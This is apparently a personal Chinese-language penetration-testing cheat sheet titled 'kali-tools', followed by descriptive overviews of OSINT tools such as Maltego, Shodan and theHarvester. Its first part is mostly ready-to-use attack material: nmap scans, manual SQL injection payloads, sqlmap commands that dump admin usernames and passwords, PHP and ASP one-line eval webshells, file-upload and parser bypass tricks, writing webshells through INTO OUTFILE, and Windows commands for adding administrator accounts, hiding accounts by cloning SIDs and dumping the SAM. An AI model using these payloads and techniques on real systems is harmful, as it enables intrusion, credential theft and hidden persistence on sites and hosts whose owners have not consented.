# kali-tools

---

nmap

“-sS”tcp syn扫

“-sP”ping方式扫

“-v”显示扫描详细过程

“-O”识别远程操作系统

“-p”指定端口

192.168.1.1-192.168.1.100

192.168.1.0/24

nmap  -sP 172.28.0.0/24 -oG test.txt

nmap  -sP 172.28.0.0/24 -oG - 不保存

open端口开放

filtered端口被防火墙安全软件阻止或者w网络堵塞

closed关闭

nmap  -sS -p 3389 172.28.0.0/24 -oG - | grep open

nmap -sS -O -sS 172.28.0.1

windows php 不区分

nmap -p 80 --script=http-enum.nse www.xisu.com 敏感信息扫描

nmap -p 80 --script=http-sql-injection.nse 172.28.0.0 注入

---

GET /index.html HTTP/1.1\

Host: www.baidu.com\

kali>whatweb

inurl:asp?id=

asp get >id=23 and 1=1

asp get >id=23 and 1=2 显示错误

id=23 and exists（select * from admin）

			
asp?id=1142 and exists(select * from%20 admin)

asp?id=1142 and exists(select admin,password from%20 admin)

字段

asp?id=1142 order by 22
			 
name、username、user_name、admin、 adminuser、admin_user、admin_username、adminname


password、pass、userpass、user_pass pwd userpwd adminpwd admin_pwd
		
---
	
###sqlmap

sqlmap -u http://192.168.1.100/Less-1/?id=1

sqlmap -u https://192.168.1.100/Less-1/?id=1 --force-ssl

sqlmap -u http://192.168.1.100/Less-1/?id=1 --dbs

sqlmap -u http://192.168.1.100/Less-1/?id=1 --current-db 当前使用哪个数据库	

sqlmap -u http://192.168.1.100/Less-1/?id=1 --current-user 当前使用数据库使用用户

sqlmap -u http://192.168.1.100/Less-1/?id=1 --current-dba  是否是数据库管理员

sqlmap -u http://172.28.31.117/Production/PRODUCT_DETAIL.asp?id=1406 --tables 爆表

sqlmap -u http://172.28.31.117/Production/PRODUCT_DETAIL.asp?id=1406 --tables -D "admin" 指定数据库 

sqlmap -u http://172.28.31.117/Production/PRODUCT_DETAIL.asp?id=1406 --columns -T  "admin" -D  "data" 指定数据库中表名的字段
sqlmap -u http://172.28.31.117/Production/PRODUCT_DETAIL.asp?id=1406 --dump -C  "username,password" --columns -T 
"admin" -D  "data" 指定数据库中表名的字段
			
sqlmap -u http://192.168.1.100/Less-1/?id=1 -D security --tables

sqlmap -u http://192.168.1.100/Less-1/?id=1 -D security -T users --columns
sqlmap -u http://192.168.1.100/Less-1/?id=1 -D security -T users -C password,username --dump

sqlmap -u http://192.168.1.100/Less-1/?id=1 --users

sqlmap -u http://192.168.1.100/Less-1/?id=1 --passwords

sqlmap --version	
http://172.28.31.117/Production/PRODUCT_DETAIL.asp?id=1406 --tables

sqlmap -u http://172.28.31.117/Production/PRODUCT_DETAIL.asp?id=1406 --cloumns -T "manager_user"

sqlmap -u http://172.28.31.117/Production/PRODUCT_DETAIL.asp?id=1406 --dump -C "username,passowrd"  -T "manager_user"

---
		
###cookie
 sqlmap -u "http://172.28.31.117/Production/PRODUCT_DETAIL.asp" --cookie "id=1140"  --level 2 --tables
 
sqlmap -u "http://172.28.31.117/Production/PRODUCT_DETAIL.asp"  --cookie "id=1141"   --columns -T admin --level 2

sqlmap -u "http://172.28.31.117/Production/PRODUCT_DETAIL.asp"  --cookie "id=1141"    --dump -T admin -C
 "admin,password" --level 2
			
php一句话：<?php @eval($_POST['pass']);?>
asp一句话：<%eval request("pass")%>

---

###中国菜刀
webshell、图片、

http://172.28.31.117/production/product_SMALLPhoto/2020311153139764.jpeg

一句话改造%> <%eval request("pass")%> <%'

php一句话：?> <?php @eval($_POST['pass']);?> <?php #

抓包获取url cookie

brupsuite上传webshell，获取cookie，上传页面，明小子综合上传
			
.asp;*.jpg扩展名为asp

.asp;123.jpg

iis解析漏洞
apache 解析漏洞，test.php.xx 从后向前解析

编辑器上传漏洞

%2Fa.asp%NewFolderName=a.asp 

/a.asp/a.jpeg
			
sql写入webshell select "test" into outfile "D:/www/test1.txt"

 select * from hack union select 1,一句话，3 into outfile "D:/www/test1.txt"；
 
sqlmap **** --is-dba
sqlmap https：//** --file-wirte "本地/ma.php" --file-dest "目标/ma.php"
			
php注入点http://ip/info_show.php?info_id=142

sqlmap>php

site：www.baidu.com warning

物理地址暴露

www.baidu.com and 1=2 报错 暴露目录，文件上传漏洞
工具找主目录

权限上传

无权限上传，无权限上传编辑器漏洞，主目录，管理员权限
上传前端验证，后端验证
前端验证绕过
后端mime类型
解析漏洞，brup拦截改包
			
google hosts、代理服务器、翻墙软件
社工库
			
php
info_show.php?info_id=142 and 1=1正常 1=2 不正常 注入点

order by猜字段数量

union select 1，2，3，4，5
info_show.php?info_id=142 and 1=1 union select 联合查询
select * from hack where id=1 and 1=2 union 1，2，3；只显示联合查询内容
select * from hack where id=1 and 1=2 union 1，version()，3；
select * from hack where id=1 and 1=2 union 1，version()，user()；
union select id=1 and 1=2 union 1，version()，user()；
union select  database()，version()，user()；	

---

###mysql 基本操作函数
and 1=2 union select 1，table_name，3，4，5 from information_schema.tables where table_schema="goacn"

select column_name from information_schema.column where table_name="hack"

govcn数据库中包含d的数据表

union select 1，group_concat(talbe_name),3,4,5 form information_schema.tables where table_schema="govcn" 显示字段中所有内容

and 1=2 union select 1,group_concat(column_name),3,4,5 from information_schema.column where
 table_name="admin"
 
and 1=2 union select 1,unhex(hex(username)),unhex(hex(password)),4,5 from admin	

unhex(hex())函数编码转换，解决网站编码不一致的问题
			
大小写waf绕过

/*!and* 1=2


---

###提权
net user administrator

net user guest /active:yes

net user guest /active:no

net user hack 123 /add

net user hack 456

net user hack /del

net user hack

net user hack /add

net localgroup administrato
rs
net localgroup administrators test /add

net localgroup administrator test /del

whoami

churrasco "net user hack 123 /add"

netstat -ano

pid溢出

"c:\windows\system32\config\SAM"

quarksPwDump

net user test$	

安全标识符sid

whoami  /all 查看当前用户sid

导入注册表用户，隐藏账号

注册表复制sid。克隆administrator



---


Maltego

Maltego 擅长发现人员、公司、域和互联网上公开访问信息之间的关系。该工具也以可摄入大量已发现信息并以直观易懂的图表呈现而闻名。这些图表在将原始情报转化为可行情报上表现良好，每幅图可拥有多达 1 万个数据点。

Maltego 自动化搜索不同公开数据源，所以用户可以一键执行多个查询。该程序将搜索计划称为“转换操作”，并默认设置了不少包含常见公开信息源的计划，比如 DNS 记录、Whois 记录、搜索引擎和社交网络。因为采用公共接口执行搜索，该程序兼容具备公共接口的任意信息源，所以向转换操作添加更多搜索或构建全新转换操作都十分方便。

信息收集完毕后，Maltego 会关联信息以揭示姓名、电子邮件地址、别名、公司、网站、文档拥有者、子公司和其他信息间的隐藏关系，辅助调查，或查找潜在问题。Maltego 是 Java 程序，兼容 Windows、Mac 和 Linux 平台。

名为 Maltego CE 的精简版是免费的。桌面版 Maltego XL 每实例 1,999 美元。大规模商业用途的服务器安装版 4 万美元起，附有全套培训项目。

---


Recon-ng

Recon-ng 是 Python 程序，界面与著名的 Metasploit Framework 非常相似，用过 Metasploit 的人应该很快就能上手。该程序还具备很多 Python 模块缺乏的互动帮助功能，开发人员的学习时间应该不会太久。

Recon-ng 自动化很多耗时的 OSINT 操作，比如剪切和粘贴。虽没宣称可执行所有 OSINT 收集操作，但 Recon-ng 可用于自动化大部分主流信息收集，为仍需人工处理的事件留出更多时间。

Recon-ng 采用内置大量功能的模块化框架，使最初级的 Python 开发人员都可以创建公开可用数据搜索并返回优质结果。标准化输出、数据库互操作、发送 Web 请求和管理 API 密钥等常见任务均可在界面中找到。开发人员不用编程执行搜索，只需选择想要执行的功能，几分钟之内就能构建出自动化模块。

Recon-ng 是免费开源软件。维基上有此工具的使用指南，还有其最佳实践的详尽介绍。

---

theHarvester

theHarvester 是本列表中最简单的工具，旨在捕获公司自有网络之外存在的公开信息。此工具也可查找内部网络上的意外事件，但其主要用途还是面向外部的。用于渗透测试或类似演习前的侦察步骤也很有效。

theHarvester 采用的信息源包含 Bing 和 Google 等常用搜索引擎，还有不那么为人所知的 dogpile、DNSdumpster 和 Exalead 元数据引擎。Netcraft Data Mining 和 AlienVault Open Threat Exchange 也为其所用。theHarvester 甚至能利用 Shodan 搜索引擎来查找已发现主机上的开放端口。总体上，theHarvester 工具收集电子邮件、名称、子域、IP 和 URL。

theHarvester 无需特别准备就可访问大多数开放源。但有些源需要 API 密钥。另外，其最低环境要求是 Python 3.6。

任何人都可在 GitHub 上获取 theHarvester。建议在克隆时使用 virtualenv 命令创建单独的 Python 环境。

---

Shodan


Shodan 是查找数十亿物联网设备相关情报的专用搜索引擎，这些设备通常不可搜索，但如今已遍布生活的方方面面。Shodan 搜索引擎也可用于查找目标系统上的开放端口和漏洞。theHarvester 等一些其他 OSINT 工具会将 Shodan 用作数据源，尽管与 Shodan 的深度互动需要付费账户。

Shodan 可监视和搜索的位置之多令人惊讶，是能够检查运营技术 (OT) 的少数搜索引擎之一，可用于检测电站和制造工厂之类地方的工业控制系统。如果没有 Shodan 这样的工具，对部署了 IT 和 OT 两种技术的产业执行 OSINT 收集工作，就会缺失很大一块。

除了摄像头、建筑传感器和安全装置等 IoT 设备，Shodan 还可检查数据库一类的东西，查看除主要接口之外还有没有别的公开可用的渠道从中获取信息。Shodan 甚至可用于视频游戏，发现隐于企业网络上的《我的世界》和《反恐精英：全球攻势》服务器，查看产生了哪些漏洞。

任何人都可购买自由职业者许可，每月可扫描至多 5,120 个 IP 地址，返回最多 100 万条结果。售价 59 美元每月。企业许可每月扫描 IP 地址上限为 30 万个，返回结果数不限。企业版每月花费 899 美元，包含漏洞搜索过滤器和高级支持。

---

Metagoofil

又一款 GitHub 上免费可用的工具，对公开文档元数据抽取做了优化。Metagoofil 几乎可调查公开渠道可达的任意文档类型，包括 .pdf、.doc、.ppt、.xls 等。

Metagoofil 所能收集的有趣数据量大到惊人。搜索返回的东西包括与已发现文档相关联的用户名，如果可用的话，有时候还有真实姓名。该工具还可绘制出访问这些文档的路线图，提供文档宿主企业的服务器名称、共享资源和目录树信息等。

Metagoofil 找到的所有东西都对黑客有用，黑客可以之发起密码暴力破解攻击或者电子邮件网络钓鱼攻击。想要保护自身的公司也可以利用同样的 OSINT 信息，在恶意黑客采取行动前加以防护或隐藏。

---

searchcode

若需真正深入探索 OSINT 收集复杂矩阵，searchcode 是查找源代码中有用情报的高度专业化搜索引擎。令人惊讶的是，这么强大的引擎竟然仅是一名开发人员的杰作。

因为要先添加代码库才可以搜索程序，searchcode 其实跨越了 OSINT 工具和非公开信息搜索工具之间的界线。但因为开发人员可以发现在用应用或开发中应用的代码内含敏感信息问题，searchcode 仍可被视为一款 OSINT 工具。若是针对开发中的应用，这些问题就能在应用从开发阶段进入生产环境之前修复。

尽管涉及代码的任何问题都要求比谷歌搜索更高深一点的知识，但 searchcode 在将界面做到尽可能简单易用方面成效不错。用户只需输入其检索字段，searchcode 就会返回相关结果，代码行中高亮显示要搜索关键词。推荐搜索包含用户名、eval $_GET 调用类安全漏洞、re.compile 这种多此一举的函数，以及可被用于触发代码注入攻击的特殊字符。

大多数时候，searchcode 返回的结果是不言自明的。不过，如果有需要的话，也可以仔细筛查以找出更深层次的信息或匹配问题。

